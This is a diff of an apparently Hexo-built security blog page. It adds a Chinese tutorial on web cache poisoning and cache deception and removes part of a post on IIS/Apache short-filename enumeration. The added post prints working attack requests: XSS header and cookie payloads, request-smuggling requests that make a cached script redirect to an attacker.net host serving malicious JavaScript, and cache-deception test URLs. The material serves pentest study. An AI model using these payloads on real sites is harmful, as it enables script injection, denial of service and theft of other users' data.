@@ -188,6 +188,154 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/21/%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92%E5%8F%8A%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="sing">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sing's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/11/21/%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92%E5%8F%8A%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">缓存中毒及缓存欺骗攻击</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-11-21 23:29:08 / Modified: 23:30:33" itemprop="dateCreated datePublished" datetime="2022-11-21T23:29:08+08:00">2022-11-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92%E5%8F%8A%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB/" itemprop="url" rel="index"><span itemprop="name">缓存中毒及缓存欺骗攻击</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="0x01-区别"><a href="#0x01-区别" class="headerlink" title="0x01 区别"></a>0x01 区别</h1><h2 id="缓存中毒"><a href="#缓存中毒" class="headerlink" title="缓存中毒"></a>缓存中毒</h2><ul>
+<li>攻击者通过缓存中毒攻击，在应用程序中的 web 缓存中存储恶意内容，恶意内容将提供给其他应用程序用户。<h2 id="缓存欺骗"><a href="#缓存欺骗" class="headerlink" title="缓存欺骗"></a>缓存欺骗</h2></li>
+<li>攻击者通过缓存欺骗攻击，将其他用户的敏感信息储存到缓存中，然后攻击者通过检索缓存内容获取其他用户的信息。</li>
+</ul>
+<h1 id="0x02-缓存中毒"><a href="#0x02-缓存中毒" class="headerlink" title="0x02 缓存中毒"></a>0x02 缓存中毒</h1><p>缓存中毒的目的是使客户端加载由攻击者控制的资源。执行缓存中毒攻击的前提是识别<code>非缓存键</code>（unkeyed inputs）。</p>
+<ul>
+<li>缓存键（keyed inputs）：指的是作为缓存服务器识别某个请求特征的请求信息，如特征匹配，则从缓存服务器返回已缓存的响应信息，通常为：<code>request-line</code> 和 <code>user-agent</code>。</li>
+<li>非缓存键（unkeyed inputs）：指的是不作为缓存服务器匹配特征的其他请求信息，如 <code>Cookie: language=pl</code>;</li>
+</ul>
+<p>所谓识别<code>非缓存键</code>，其实是指识别不作为缓存特征却能影响响应结果的请求信息。可能是参数，可能是请求头。</p>
+<h2 id="识别-web应用程序是否使用了缓存技术"><a href="#识别-web应用程序是否使用了缓存技术" class="headerlink" title="识别 web应用程序是否使用了缓存技术"></a>识别 web应用程序是否使用了缓存技术</h2><h3 id="1-检查-HTTP-标头"><a href="#1-检查-HTTP-标头" class="headerlink" title="1. 检查 HTTP 标头"></a>1. 检查 HTTP 标头</h3><p>通常，当响应信息来自缓存时，响应包会存在明确响应标头。</p>
+<p><strong>服务器缓存标头</strong></p>
+<ul>
+<li><code>X-Cache</code>：有两个值 miss 和 hit ,分别表示命中缓存失败及命中缓存成功。</li>
+<li><code>Cache-Control</code> ：指示资源是否正在被缓存以及缓存资源下一次被缓存的时间间隔：<code>Cache-Control: public, max-age=1800</code>。</li>
+<li><code>Vary</code>：指示哪些请求信息被视为缓存键，即自定义缓存键。</li>
+<li><code>Age</code> ：指示缓存资源在缓存服务器中的存活时间长度（以秒为单位）</li>
+<li><code>Server-Timing: cdn-cache; desc=HIT</code>：缓存资源命中</li>
+</ul>
+<p><strong>本地缓存标头</strong></p>
+<ul>
+<li><code>Clear-Site-Data</code>: 指示应被删除的缓存信息 <code>Clear-Site-Data: &quot;cache&quot;, &quot;cookies&quot;</code>。</li>
+<li><code>Expires</code>: 指示缓存过期日期，<code>Expires: Wed, 21 Oct 2015 07:28:00 GMT</code>。</li>
+<li><code>Pragma: no-cache</code> :表示不做缓存。</li>
+<li><code>Warning</code>: <em><strong>未知！！！</strong></em></li>
+</ul>
+<h3 id="2-检查-400-响应码"><a href="#2-检查-400-响应码" class="headerlink" title="2. 检查 400 响应码"></a>2. 检查 400 响应码</h3><p>使用不符合规范的请求标头（例如：<code>\:</code>）对某个资源进行请求，迫使应用程序返回 400 错误响应码。然后正常请求该资源，若仍然返回 400 错误响应码，则证明该 web 站点受到缓存中毒影响。某些缓存服务器可能不对响应状态码进行缓存，此时，该测试无效。</p>
+<h2 id="识别非缓存键"><a href="#识别非缓存键" class="headerlink" title="识别非缓存键"></a>识别非缓存键</h2><p>使用 <a target="_blank" rel="noopener" href="https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943">Param Miner</a> 暴力破解可能影响响应结果的参数或者请求标头。</p>
+<h2 id="触发恶意响应"><a href="#触发恶意响应" class="headerlink" title="触发恶意响应"></a>触发恶意响应</h2><p>识别非缓存键后，分析该非缓存键如何影响响应结果。触发XSS攻击或者DOS攻击。</p>
+<h2 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h2><h3 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h3><p>假设 x-forward-for 反映在响应结果中，通过发送 XSS 攻击 payload 毒化缓存，访问 <code>/en?region=uk</code> 的用户均被 XSS 攻击。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/en?region=uk</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>innocent-website.com</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>a.&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>假设 Cookie 反映在页面上，则可以用通过 Cookie 投毒。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable.com</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd&quot;%2balert(1)%2b&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="通过多个请求标头进行缓存中毒攻击"><a href="#通过多个请求标头进行缓存中毒攻击" class="headerlink" title="通过多个请求标头进行缓存中毒攻击"></a>通过多个请求标头进行缓存中毒攻击</h3><p>有时候需要多个非缓存键才能进行投毒缓存攻击。例如，如果某个页面存在以下情况：服务器会将所有 <code>http</code> 请求转发到 <code>https</code>，并且将 <code>x-forward-host</code> 作为目的域名。发送一个 http 请求，将 <code>x-forward-scheme</code> 设置为 <code>http</code>，服务器识别到 <code>http</code> ，触发重定向，并使用 <code>x-forward-host</code> 作为重定向的域名。所以可以通过重定向来控制页面的指向资源。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/resources/js/tracking.js</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>acc11fe01f16f89c80556c2b0056002e.web-security-academy.net</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/</span><br><span class="line"><span class="attribute">X-Forwarded-Scheme</span><span class="punctuation">: </span>http</span><br></pre></td></tr></table></figure>
+
+<h3 id="http-请求走私-http-缓存中毒"><a href="#http-请求走私-http-缓存中毒" class="headerlink" title="http 请求走私 + http 缓存中毒"></a>http 请求走私 + http 缓存中毒</h3><p>如果 web 站点存在 http 走私漏洞且存在缓存中毒漏洞，则可以迫使客户端在请求 <code>/static/include.js</code> 的时候，返回 <code>index.html</code> 的内容，这将导致 <code>/static/include.js</code> 无法正常被客户端访问（DOS攻击）。</p>
+<ol>
+<li><p>执行 http 走私攻击</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>35</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /index.html HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Foo</span>: x</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>受害客户端访问 <code>/static/include.js</code></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/static/include.js</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>已被毒化的socket与受害客户端的请求结合，被后端应用程序视为一个 http 请求，触发走私攻击。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Foo</span><span class="punctuation">: </span>xGET /static/include.js HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>后端程序接收到被毒害的请求，资源 <code>/static/include.js</code> 的请求返回了 <code>/index.html</code> 的内容。且该响应资源被缓存服务器存储。至此，受害客户端对于 <code>/static/include.js</code> 的请求会被毒化，返回 <code>/index.html</code> 的内容。</p>
+</li>
+</ol>
+<p>如果 web 站点存在重定向接口，攻击者甚至可以控制客户端加载的 js 文件内容。<br>假设网站有 URI： <code>/post/next?postId=3</code>，访问该 URI 之后，将会被重定向到 <code>/post?postId=4</code>，并且引用 <code>Host</code> 标头作为重定向的目标域。</p>
+<ol>
+<li>攻击者发送 http 走私请求，如下所示：</li>
+</ol>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>124</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">0</span></span><br><span class="line"><span class="language-routeros"><span class="built_in">GET</span> /post/next?<span class="attribute">postId</span>=3 HTTP/1.1</span></span><br><span class="line"><span class="language-routeros">Host: attacker.net</span></span><br><span class="line"><span class="language-routeros">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-routeros">Content-Length: 10</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros"><span class="attribute">x</span>=1</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><p>受害客户端通过 <code>GET</code> 请求方式访问 <code>/static/include.js</code></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/static/include.js</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>已被毒化的socket与受害客户端的请求结合，被后端应用程序视为一个 http 请求，触发走私攻击。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/post/next?postId=3</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>attacker.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>10</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">x</span>=<span class="number">1</span>GET /static/include.js HTTP/<span class="number">1</span>.<span class="number">1</span>\r\nHost: vulnerable-website.com</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>由于存在重定向漏洞，客户端将会被重定向到 <code>attacker.net/post?postId=4</code>（302重定向包会被返回，并且储存到缓存服务器上），攻击者设置在访问恶意服务器 URL: <code>attacker.net/post?postId=4</code> 时返回恶意 JS 代码。至此，<code>/static/include.js</code> 缓存内容已被毒化成功，访问 <code>/static/include.js</code> 的响应内容均会被替换成攻击者控制的恶意 JS 内容。</p>
+</li>
+</ol>
+<h2 id="Web缓存中毒自动化测试工具"><a href="#Web缓存中毒自动化测试工具" class="headerlink" title="Web缓存中毒自动化测试工具"></a>Web缓存中毒自动化测试工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner">Web缓存中毒漏洞扫描程序</a>，用法示例：<code>wcvs -u example.com</code></p>
+<h1 id="0x03-缓存欺骗"><a href="#0x03-缓存欺骗" class="headerlink" title="0x03 缓存欺骗"></a>0x03 缓存欺骗</h1><p>静态文件(如： <code>.js</code>,<code>.css</code>,<code>.png</code> 等等)通常被配置为保存到缓存服务器中。例如，访问 <code>www.example.com/profile.php/nonexistent.js</code> 的时候，由于某些缓存服务器仅识别访问文件后缀便将响应结果储存在缓存服务器中。但是后端应用程序对于该链接，响应的结果却是：<code>www.example.com/profile.php</code>,其中该响应结果包含用户的一些敏感信息。上述问题将会导致缓存服务器错误地缓存了包含用户敏感信息的响应结果。攻击者可以通过钓鱼，xss，csrf的方式诱使受害者访问 <code>www.example.com/profile.php/nonexistent.js</code> ，从而进行缓存欺骗攻击，窃取用户敏感信息。</p>
+<p>可能有用的测试形式</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.example.com/profile.php/.js">www.example.com/profile.php/.js</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.example.com/profile.php/.css">www.example.com/profile.php/.css</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.example.com/profile.php/test.js">www.example.com/profile.php/test.js</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.example.com/test.js">www.example.com/profile.php/../test.js</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.example.com/test.js">www.example.com/profile.php/%2e%2e/test.js</a></li>
+<li>Use less known extensions such as .avif</li>
+</ul>
+<blockquote>
+<p>缓存欺骗真实的个案：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/593712">https://hackerone.com/reports/593712</a></p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/15/hop-by-hop%E7%9B%B8%E5%85%B3%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E7%82%B9/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1679,410 +1827,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="sing">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="sing's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">渗透测试之短文件名漏洞</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-03-26 02:33:52" itemprop="dateCreated datePublished" datetime="2022-03-26T02:33:52+08:00">2022-03-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-04-07 22:15:10" itemprop="dateModified" datetime="2022-04-07T22:15:10+08:00">2022-04-07</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="渗透测试之短文件名漏洞"><a href="#渗透测试之短文件名漏洞" class="headerlink" title="渗透测试之短文件名漏洞"></a>渗透测试之短文件名漏洞</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><p>某次测试，使用 dirsearch 对网站目录进行扫描，突然发现一个终端出现一个奇怪的路径： <code>index~1</code> ，且响应码为 200。访问后发现该文件为 index 备份文件，浏览器直接显示文件源码。真奇怪啊，真奇怪。后面百度发现，<code>Apache + Windows</code> 组合，会存在短文件名下载漏洞。参考网上内容，整理合并资料，遂有下文。</p>
-<h2 id="0x02-Windows-Apache-x3D-短文件名任意文件下载"><a href="#0x02-Windows-Apache-x3D-短文件名任意文件下载" class="headerlink" title="0x02-Windows + Apache &#x3D; 短文件名任意文件下载"></a>0x02-Windows + Apache &#x3D; 短文件名任意文件下载</h2><p>Windows下采用了短文件名机制，如</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\wooyun12312394944545.txt</span><br></pre></td></tr></table></figure>
-
-<p>可采用如下方式访问</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\wooyun~1.txt</span><br></pre></td></tr></table></figure>
-
-<p>假如web应用程序中存在一个备份文件，文件名是这样的：<code>http://127.0.0.1/admin/databack/sql/metinfo_met_20140202_ixzlfo_1.zip</code>。当目标站点为 windows + apache(影响版本范围不确认，网上说 Apache 服务器默认支持短文件名访问) 的时候，我们就可以通过短文件名的方式直接下载文件：<code>http://127.0.0.1/admin/databack/sql/metinf~1.zip</code></p>
-<p><strong>漏洞证明：</strong></p>
-<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220324165011.png"></p>
-<p><em>PS : IIS 下不允许使用短文件来访问资源，而 Apache 支持短文件名来访问资源，因此上面介绍的任意文件下载只能适应于 windows 系统下的 Apache 搭建的网站中（Tomcat 也不支持使用短文件名来访问资源）。IIS 中虽然不能利用短文件名来访问资源，但是存在 IIS 短文件泄露漏洞，可以利用短文件名来猜测网站目录下的文件和目录名</em></p>
-<h2 id="0x03-IIS-短文件名"><a href="#0x03-IIS-短文件名" class="headerlink" title="0x03-IIS 短文件名"></a>0x03-IIS 短文件名</h2><h3 id="IIS短文件漏洞的由来"><a href="#IIS短文件漏洞的由来" class="headerlink" title="IIS短文件漏洞的由来"></a>IIS短文件漏洞的由来</h3><p>Microsoft IIS 短文件&#x2F;文件夹名称信息泄漏最开始由Vulnerability Research Team（漏洞研究团队）的Soroush Dalili在2010年8月1日发现，并于2010年8月3日通知供应商（微软公司）。微软公司分别于2010年12月1日和2011年1月4日给予答复下个版本修复。2012年6月29日，此漏洞公开披露（中危）。</p>
-<p>此漏洞实际是由HTTP请求中旧 <code>DOS 8.3</code> 名称约定（SFN）的代字符（<code>〜</code>）波浪号引起的。它允许远程攻击者在Web根目录下公开文件和文件夹名称（不应该可被访问）。攻击者可以找到通常无法从外部直接访问的重要文件，并获取有关应用程序基础结构的信息。</p>
-<p>Microsoft IIS 波浪号造成的信息泄露是世界网络范围内最常见的中等风险漏洞。这个问题至少从1990年开始就已经存在，但是已经证明难以发现，难以解决或容易被完全忽略。</p>
-<h3 id="IIS短文件漏洞影响范围及危害"><a href="#IIS短文件漏洞影响范围及危害" class="headerlink" title="IIS短文件漏洞影响范围及危害"></a>IIS短文件漏洞影响范围及危害</h3><h4 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h4><blockquote>
-<p>IIS 1.0，Windows NT 3.51<br>IIS 3.0，Windows NT 4.0 Service Pack 2<br>IIS 4.0，Windows NT 4.0选项包<br>IIS 5.0，Windows 2000<br>IIS 5.1，Windows XP Professional和Windows XP Media Center Edition<br>IIS 6.0，Windows Server 2003和Windows XP Professional x64 Edition<br>IIS 7.0，Windows Server 2008和Windows Vista<br>IIS 7.5，Windows 7（远程启用<customErrors>或没有web.config）<br>IIS 7.5，Windows 2008（经典管道模式）<br>IIS 8.0，Windows 8, Windows Server 2012<br>IIS 8.5，Windows 8.1,Windows Server 2012 R2<br>IIS 10.0，Windows 10, Windows Server 2016</p>
-</blockquote>
-<h4 id="支持方法"><a href="#支持方法" class="headerlink" title="支持方法"></a>支持方法</h4><p>DEBUG、OPTIONS、GET、POST、HEAD、TRACE<br><strong>IIS 7.5(Windows 2008 R2)</strong> 和 <strong>IIS 8.0(Windows 2012)</strong> 过程中，当使用 OPTIONS 来代替 GET 方法时，如果请求中的短文件名是存在的，IIS就会返回一个不一样的错误信息。<strong>IIS 8.0</strong>、<strong>IIS 8.5</strong> 和 <strong>IIS 10.0</strong> 的短文件名称均可以通过OPTIONS和TRACE方法被猜测成功。</p>
-<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ol>
-<li>利用 <code>~</code> 字符猜解暴露短文件&#x2F;文件夹名（主要危害）</li>
-<li>Net Framework 的拒绝服务攻击 （副危害）：<br>据Soroush Dalili在研究表明，攻击者如果在文件夹名称中向发送一个不合法的.Net文件请求，.NeFramework将递归搜索所有的根目录，消耗网站资源进而导致DOS问题。微软认为此危害是可恢复的DOS，将在后续SP版本修改，此处不做探讨研究。</li>
-</ol>
-<h4 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h4><ol>
-<li>只有前六位字符直接显示，后续字符用 ~1 指代。其中数字 1 还可以递增，如果存在多个文件名类似的文件（名称前6位必须相同，且后缀名前3位必须相同）；</li>
-<li>后缀名最长只有 3 位，多余的被截断，超过 3 位的长文件会生成短文件名；</li>
-<li>所有小写字母均转换成大写字母；</li>
-<li>长文件名中含有多个“.”，以文件名最后一个“.”作为短文件名后缀；</li>
-<li>长文件名前缀&#x2F;文件夹名字符长度符合 0-9 和 Aa-Zz 范围且需要大于等于 9 位才会生成短文件名，如果包含空格或者其他部分特殊字符，不论长度均会生成短文件。</li>
-</ol>
-<p>我们可以在启用 .net 的 IIS 下使用GET方法暴力列举短文件名，原因是攻击者使用通配符 <code>*</code> 和 <code>?</code> 发送一个请求到 IIS,当 IIS 接收到一个文件路径中包含 <code>~</code> 请求时，它的反应是不同的，即返回的 HTTP 状态码和错误信息不同。基于这个特点，可以根据 HTTP 的响应区分一个可用或者不可用的文件。如下表所示不同 IIS 版本返回信息的不同：</p>
-<p><strong>IIS 5.0 ~ IIS 7.X短文件猜解HTTP响应信息：访问构造的某个存在的短文件名，会返回404；访问构造的某个不存在的短文件名，会返回400。</strong></p>
-<table>
-<thead>
-<tr>
-<th>IIS VERSION</th>
-<th>URL</th>
-<th>Result&#x2F;Error Message</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>IIS 6</td>
-<td>&#x2F;valid*~1*&#x2F;.aspx</td>
-<td>HTTP 404 - File not found</td>
-</tr>
-<tr>
-<td>IIS 6</td>
-<td>&#x2F;Invalid*~1*&#x2F;.aspx</td>
-<td>HTTP 400 - Bad Request</td>
-</tr>
-<tr>
-<td>IIS 5.X</td>
-<td>&#x2F;valid*~1*</td>
-<td>HTTP 404 - File not found</td>
-</tr>
-<tr>
-<td>IIS 5.X</td>
-<td>&#x2F;Invalid*~1*</td>
-<td>HTTP 400 - Bad Request</td>
-</tr>
-<tr>
-<td>IIS 7.X.NET.2(No Error Handling)</td>
-<td>&#x2F;valid*~1*&#x2F;</td>
-<td>Page contains: “Error Code 0x00000000”</td>
-</tr>
-<tr>
-<td>IIS 7.X.NET.2(No Error Handling)</td>
-<td>&#x2F;Invalid*~1*&#x2F;</td>
-<td>Page contains: “Error Code 0x80070002”</td>
-</tr>
-</tbody></table>
-<p><strong>IIS 状态码猜解过程：IIS较低版本+ASP.NET 环境下使用GET方法反复循环猜测，直到猜解出短文件名</strong></p>
-<table>
-<thead>
-<tr>
-<th>URL</th>
-<th>Result</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><a target="_blank" rel="noopener" href="http://sdl.me/*~1*/.aspx">http://sdl.me/*~1*/.aspx</a></td>
-<td>404. Valid: one or more file(s)&#x2F;folder(s) with short name is&#x2F;are available on the server</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://sdl.me/a*~1*/.aspx">http://sdl.me/a*~1*/.aspx</a></td>
-<td>404 - Valid: It starts with“A”</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://sdl.me/aa*~1*/.aspx">http://sdl.me/aa*~1*/.aspx</a></td>
-<td>400 - Invalid: The second letter is not“A”</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://sdl.me/ab*~1*/.aspx">http://sdl.me/ab*~1*/.aspx</a></td>
-<td>400 - Invalid: The second letter is not“B”</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://sdl.me/ac*~1*/.aspx">http://sdl.me/ac*~1*/.aspx</a></td>
-<td>404 - Valid: The second letter is “C”</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://sdl.me/ac%3f~1*/.aspx">http://sdl.me/ac%3f~1*/.aspx</a></td>
-<td>400 - Invalid: It has more than three characters</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://sdl.me/ac%3f%3f%3f%3f~1/*/.aspx">http://sdl.me/ac%3f%3f%3f%3f~1\*/.aspx</a></td>
-<td>404 - Valid: It has 6 or more than 6 characters</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://sdl.me/acsecr~1*/.aspx">http://sdl.me/acsecr~1*/.aspx</a></td>
-<td>404 - Valid: It starts with“ACSECR”</td>
-</tr>
-<tr>
-<td><a target="_blank" rel="noopener" href="http://sdl.me/acsecr/~1/.aspx">http://sdl.me/acsecr\~1/.aspx</a></td>
-<td>400 - Invalid: It is not a folder and it has an extension</td>
-</tr>
-<tr>
